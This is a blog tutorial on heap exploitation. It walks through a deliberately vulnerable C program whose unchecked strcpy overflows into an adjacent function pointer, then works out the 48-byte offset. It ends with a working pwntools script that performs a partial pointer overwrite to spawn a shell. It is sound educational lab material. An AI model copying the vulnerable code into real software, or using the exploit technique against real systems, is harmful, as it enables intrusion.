---
title: "Heap Exploitation Part 3"
date: 2024-09-26
draft: false
description: "Heap Overflow"
intro: "Heap Overflow"
tags: ["heap-exploitation", "reversing", "glibc"]
image: "cover.svg"
animcard: "reversing"
animcardtitle: "Heap Overflow Dispatch"
animcardnote: "Control-flow recovery, overwritten pointers, and the final call-site pivot."
showtoc: true
hideSummary: true
---
### Intro

In this post I will walk through a small heap-overflow challenge and show how the overflow reaches a heap-resident function pointer. This is a toy binary, but it is a good lab for understanding chunk adjacency, overwrite distance, and one very important exploitation detail: why a **partial pointer overwrite** is enough in this program.

---

### Binary Info

![Screenshot at 2024-09-26 12-50-04.png](Screenshot_at_2024-09-26_12-50-04.png)

For this write-up I recompiled the binary from source and disabled PIE and the stack canary. Disabling those protections keeps function addresses stable between runs and makes the control-flow goal easier to explain.

That does **not** mean this is a realistic hardened target. It means the example is intentionally simplified so we can focus on the heap bug itself.

---

### Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct data {
    char string[0x20];
};

struct funcpointer {
    void (*fp)();
    char __pad[64 - sizeof(unsigned long)];
};

void shell() {
    system("/bin/bash");
}

void exploit() {
    printf("Exploit is completed, But where is the Shell >_<\n");
}

void fail() {
    printf("Looks like your exploit did not work this time!\n");
}

void vuln(char arg[]) {
    struct data *value;
    struct funcpointer *f;

    value = malloc(sizeof(struct data));
    f = malloc(sizeof(struct funcpointer));
    f->fp = NULL;

    strcpy(value->string, arg);

    if (strncmp(value->string, "exploited", 9) == 0) {
        f->fp = exploit;
    }

    printf("data is at %p, fp is at %p, will be calling %p\n", value, f, f->fp);
    free(value);

    if (f->fp) {
        f->fp();
    } else {
        fail();
    }
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Enter a string as argument\n");
        return -1;
    }

    vuln(argv[1]);
    return 0;
}
```

---

### First Observations

There are four details that matter immediately:

1. `value` and `f` are allocated one after the other.
2. `strcpy(value->string, arg)` copies attacker-controlled data without a length check.
3. If the input starts with `"exploited"`, the program explicitly writes `exploit` into `f->fp`.
4. The final indirect call is `f->fp()`, so corrupting that pointer gives us control over which function gets called.

The target function is `shell()`.

---

### Basic Runtime Behavior

If we run the binary with a normal input, the string comparison fails and `f->fp` stays `NULL`, so the program calls `fail()`.

![Screenshot at 2024-09-26 14-33-58.png](Screenshot_at_2024-09-26_14-33-58.png)

If we pass `"exploited"`, the comparison succeeds and the program stores the address of `exploit` in `f->fp`.

![Screenshot at 2024-09-26 14-41-50.png](b629a6fe-4269-4e2a-8309-cb8c22b116fe.png)

At this point the intended program logic is clear. The next step is figuring out how the heap overflow changes that logic.

---

### Why `exploited...` Is a Trap

A first idea might be to pass `"exploited"` followed by a long tail of `A`s:

`exploitedAAAAAAAAAAAAAAAAAAAA...`

![Screenshot at 2024-09-26 17-19-07.png](9cd1d124-ef0a-4336-9cb2-c3d274dd20a8.png)

With a longer input we do get an overflow:

![Screenshot at 2024-09-26 17-21-35.png](e7ab0639-1011-4530-8132-bd4f25260160.png)

So why does this not immediately give us control of the function pointer?

Because the same input that overflows the heap also satisfies the `strncmp(..., "exploited", 9)` check. Once that branch executes, the program writes `exploit` back into `f->fp` and overwrites our earlier corruption.

You can see the two heap allocations sitting next to each other here:

![Screenshot at 2024-09-26 17-32-33.png](Screenshot_at_2024-09-26_17-32-33.png)

And after `strcpy`, the function pointer region really is corrupted:

![Screenshot at 2024-09-26 17-41-37.png](Screenshot_at_2024-09-26_17-41-37.png)

But then execution reaches this block:

```c
if (strncmp(value->string, "exploited", 9) == 0) {
    f->fp = exploit;
}
```

That is why the next snapshot shows `f->fp` restored to the address of `exploit`:

![Screenshot at 2024-09-26 18-23-42.png](Screenshot_at_2024-09-26_18-23-42.png)

![Screenshot at 2024-09-26 18-34-43.png](103070e0-a6d9-408c-920b-018703d2fd79.png)

![Screenshot at 2024-09-26 18-41-20.png](973adb6a-cc34-46ad-a323-5b9774ad0ede.png)

So the lesson is simple: if we want to control `f->fp`, we must **avoid** the `strncmp` success path.

---

### The Correct Strategy

Instead of starting the input with `"exploited"`, we use a non-matching pattern such as a long run of `A`s:

![Screenshot at 2024-09-26 18-57-18.png](Screenshot_at_2024-09-26_18-57-18.png)

Now the program crashes because `f->fp` has been overwritten with attacker-controlled bytes like `0x616161...`, and the indirect call tries to jump to an invalid address.

That crash is useful. It proves that:

- the heap overflow reaches the function pointer
- the comparison block is no longer restoring `exploit`
- we only need the correct offset and the right bytes for `shell`

---

### Calculating the Offset

There are two clean ways to calculate the overwrite distance.

#### Using a cyclic pattern

![Screenshot at 2024-09-26 19-07-09.png](91c15284-d609-4547-977c-fa7f77b1a58f.png)

#### Using the heap layout directly

![Screenshot at 2024-09-26 17-32-33.png](Screenshot_at_2024-09-26_17-32-33-1.png)

In the heap layout screenshot:

- user input starts at `0x4052a0`
- `f->fp` is stored at `0x4052d0`

So the overwrite offset is:

```text
0x4052d0 - 0x4052a0 = 0x30 = 48
```

That means we need:

- `48` bytes of padding
- followed by the bytes that redirect `f->fp` to `shell`

---

### The Important Detail: Why a Partial Overwrite Works

This is the part that was missing in the original draft.

Our input reaches the program through `argv`, and `strcpy` also stops at the first `NUL` byte. That means we cannot just drop a full 8-byte pointer containing embedded zero bytes into the argument string and expect it to be copied as-is.

In this lab that problem is solved by the target itself:

- `f->fp` is initialized to `NULL`
- PIE is disabled, so `shell` lives at a low fixed address such as `0x4011f6`
- only the low non-zero bytes of that pointer need to be overwritten
- the remaining high bytes stay zero because the pointer started as `NULL`

So this exploit is really a **partial function-pointer overwrite**.

That is why stripping trailing `NUL` bytes from the packed address works here. It would not be a safe general rule for every target.

---

### Exploit

```python
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./overflow")
context.arch = "amd64"
context.os = "linux"

offset = 48
partial_shell_ptr = p64(elf.sym["shell"]).rstrip(b"\x00")
payload = b"A" * offset + partial_shell_ptr

io = elf.process(argv=[payload])
print(io.clean().decode("utf-8"))
io.interactive()
```

Why this works in this specific lab:

- `48` bytes reach `f->fp`
- `shell` is at a non-PIE low address
- `f->fp` was initialized to zero
- the exploit only needs the low non-zero bytes of the function pointer

---

### Result

![Screenshot at 2024-09-26 20-09-42.png](Screenshot_at_2024-09-26_20-09-42.png)

The exploit succeeds and the program ends up calling `shell()`.

---

### Limitations of This Lab

This challenge is good for learning, but it is intentionally friendly:

- the binary is non-PIE
- the target pointer sits right after the overflowing chunk
- the pointer starts as `NULL`, which makes the partial overwrite possible
- the write primitive is a simple `strcpy`

In a real target, any one of those conditions can change the exploit path completely.
